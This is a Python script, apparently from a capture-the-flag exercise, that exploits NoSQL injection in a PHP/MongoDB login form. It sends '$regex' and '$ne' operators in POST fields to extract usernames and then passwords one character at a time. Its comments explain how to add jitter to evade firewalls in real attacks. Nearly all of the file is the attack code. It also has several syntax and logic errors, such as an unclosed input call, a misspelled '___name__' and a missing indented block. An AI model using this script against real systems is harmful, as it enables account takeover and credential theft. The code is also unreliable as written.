#!/usr/bin/python
"""
Full MongoDb Enumerator

The script below will enumerate across all possible usernames.
Then after getting the characterset of all of the users It will then.
Attempt to enumerate over them until we find an exact match for the users.
After this will append the found user to our list of users. Which we'll use
to later enumerate over all of the possible passwords to crack it. Since
this will only work with nosql injection this is the perfect way to crack
passwords if you've got nosql code injection working.

This only works if they're no filtering input. Which I doubt they will be
because *obviously* w/o sql you can't have sqlinjection thus you're safe from that class of attacks. I'm joking of course we no nosql injection to do which this script carrys out.

"""
def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
	#need the requests module.
	import requests
	#and also regex.
	import re
	if usernames is None:
	username=""
	if url is None:
		#the url we're targetting.
		url=input("Enter the URL you want to target."
	#the characterset we're using.
	if character_set is None:
		#by default we're not using * or ..
		character_set=r"!#$%&\(),-/0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"

	#to say whether we need to start again.
	begin_again=True
	#the regex payload
	current_username=""
	username_charset=""
	print("Generating username Characterset")
	'''
	THE MESSAGE BELOW IS RELATED TO THE PASSWORD(MOSTLY) BUT THE KNOWLEDGE CONTAINED THEREIN APPLYS TO ANYTHING.

	First we're going to go through our entire characterset looking for the characters in it. If we see it, then we'll add it to our list.
	This will reduce the time complexity from
	O(82^n)
	But because we're going through our characterset it then becomes just
	O(82 + x^n)
	 where n is the length of the username. And x is the length of our characterset.
	For mango username it's thus.
	O( 82 + 16^14)
	compared  to
	O(16^82)
	Or
	72,057,594,037,928,018 compared to
	546,812,681,195,752,981,093,125,556,779,405,341,338,292,357,723,303,109,106,442,651,602,488,249,799,843,980,805,878,294,255,763,456

	Yes it's that much of a difference. This is where knowing a bit about optimize your code will come across with strides.

	Each iteration consists of the following.
	1) connect to the server via tcp handshake.
	2) send your post data to the server.
	3) Wait for the server to process your data.
	4) Receieve your reponses data.
	5) Parse the response data.

	So you're doing a full POST request for _every_ iteration. It's not just a simple loop and the time can be seen below the major increase in perf.

	This is for bruteforcing the password of the user mango.
	#TODO: Do the benchmark figuring out the total number of guesses for the password for both methods.
	unoptimized(O(82^n) version)
	real	2m58.727s
	user	0m3.863s
	sys	0m0.168s

	Optimized(82+(16^14))
	real	0m40.161s
	user	0m1.143s
	sys	0m0.063s

	Remember write fast code as it'll save you a ton of time. For this flag the two passwords by utilizing the faster version I was able to save
	almost 5min of wall time. And this is with _zero_ delays in how fast I was connnecting to it. I was going full force as fast as possible.
	In the real world to avoid resource exhaustion or being labeled as a DOS person you'd add some small jitter delay to your connection to avoid triggering the firewall.
	So whereas I delayed it by 0ms you'd want to in the real world set the delay to ~50ms or more to reduce the amount of attacks you're doing at a time.
	You may still trigger the firewall but 20x second will make your attacks take way way way longer.
	Of course both values should be realized as the worst-case scenario as you're very unlikely to go to the last character each time. But the ineffeciency can really add up.
	'''
	#the first part will give us our users. This will eventually be a function.
	#when creating the characterset we get each one seperately.
	for char in character_set:

		#we need to setup the post data.
		#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
		#So we will run the pattern after recombining.
		#in reality it'll be something like this.
		#get(username:$regex => $regex_pattern
		#thus we're looking for our regex pattern.
		#first we're looking for the start. Then the current username escaped for regex special characters.
		#then we're matching _any_ other characters. Set the login option to login.
		data={"username[$regex]": "[" + re.escape(char) +"]","login":"login","password[$ne]":"1"}
		#request the data. Do not allow it to actually redirect us.
		request_obj=requests.post(url,data=data,allow_redirects=False)

		#302 means we're going to login since normally after logging in you're taken somewhere else.
		if request_obj.status_code == 302:
		#since it matched we'll add it to our characterset.
			username_charset+=char
	#print ouur current pattern. This is just here to make it look like
	#the natas flag I wrote previously.
		print(char)

	users=[]
	current_username=""
	print(username_charset)

	print("Guessing Usernames")

	#begin the main loop where we loop through each character.
	for first in username_charset:
		data={"username[$regex]": "^" + first +".*","login":"login","password[$ne]":"1"}
		request_obj=requests.post(url,data=data,allow_redirects=False)
		if request_obj.status_code != 302:
			continue;
		username=first
		begin_again=True
		while begin_again:
		#set it to false so that if we don't get any matches we're done. Something is broken or we've got the full username.
			begin_again=False
			#get each character from the characterset individually.
			for char in username_charset:
				#our regex pattern is the previous username plus that 	character.
				current_username=username+ char
				#we need to setup the post data.
				#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
				#So we will run the pattern after recombining.
				#in reality it'll be something like this.
				#get(username:$regex => $regex_pattern
				#thus we're looking for our regex pattern.
				#first we're looking for the start. Then the current username escaped for regex special characters.
			#then we're matching _any_ other characters. Set the login option to login.
				data={"username[$regex]": "^" + re.escape(current_username) +".*","login":"login","password[$ne]":"1"}
			#request the data. Do not allow it to actually redirect us.
				request_obj=requests.post(url,data=data,allow_redirects=False)
				#302 means we're going to login since normally after logging in you're taken somewhere else.
				if request_obj.status_code == 302:
		#print our current pattern. This is just here to make it look like
		#the natas flag I wrote previously.
					username=current_username
					print(current_username)
				#begin again since we have a match.
					begin_again=True
				#set the username to the current username that we just matched.

				#break out of the for loop. And we go to the next loop again.
				#this will set our username candidate to the current username
				#and we'll start it again.

		users.append(username)


	print(users)

	for user in users:
		password_charset=""
		password=""
		print("Generating {}'s password characterset.".format(user))
		for char in character_set:

		#we need to setup the post data.
		#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
		#So we will run the pattern after recombining.
		#in reality it'll be something like this.
		#get(password:$regex => $regex_pattern
		#thus we're looking for our regex pattern.
		#first we're looking for the start. Then the current password escaped for regex special characters.
		#then we're matching _any_ other characters. Set the login option to login.
			data={"username":user,"password[$regex]": "[" + re.escape(char) +"]","login":"login"}
		#request the data. Do not allow it to actually redirect us.
			request_obj=requests.post(url,data=data,allow_redirects=False)

		#302 means we're going to login since normally after logging in you're taken somewhere else.
			if request_obj.status_code == 302:
		#since it matched we'll add it to our characterset.
				password_charset+=char
	#print our current pattern. This is just here to make it look like
	#the natas flag I wrote previously.
				print(char)


		current_password=""
		print("{}'s characterset {}".format(user,password_charset))
		print("Guessing {}'s Password".format(user))
		begin_again=True
	#begin the mail loop where we loop through each character.
		while begin_again:
	#set it to false so that if we don't get any matches we're done. Something is broken or we've got the full password.
			begin_again=False
		#get each character from the characterset individually.
			for char in password_charset:
			#our regex pattern is the previous password plus that character.
				current_password=password+char
			#we need to setup the post data.
			#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
			#So we will run the pattern after recombining.
			#in reality it'll be something like this.
			#get(password:$regex => $regex_pattern
			#thus we're looking for our regex pattern.
			#first we're looking for the start. Then the current password escaped for regex special characters.
			#then we're matching _any_ other characters. Set the login option to login.
				data={"username":user,"password[$regex]": "^" + re.escape(current_password) +".*","login":"login"}
			#request the data. Do not allow it to actually redirect us.
				request_obj=requests.post(url,data=data,allow_redirects=False)
				#302 means we're going to login since normally after logging in you're taken somewhere else.
				if request_obj.status_code == 302:
	#print our current pattern. This is just here to make it look like
	#the natas flag I wrote previously.
					print(current_password)
				#begin again since we have a match.
					begin_again=True
				#set the password to the current password that we just matched.
					password=current_password
				#break out of the for loop. And we go to the next loop again.
				#this will set our password candidate to the current password
				#and we'll start it again.
					break

		print("username:{} \t password:{}".format(user,password))

if ___name__ == "__main__":
	#if you want to target any sort of specific url you have to set the url and pass it to the program as the first argument.
	mongo_get_creds()
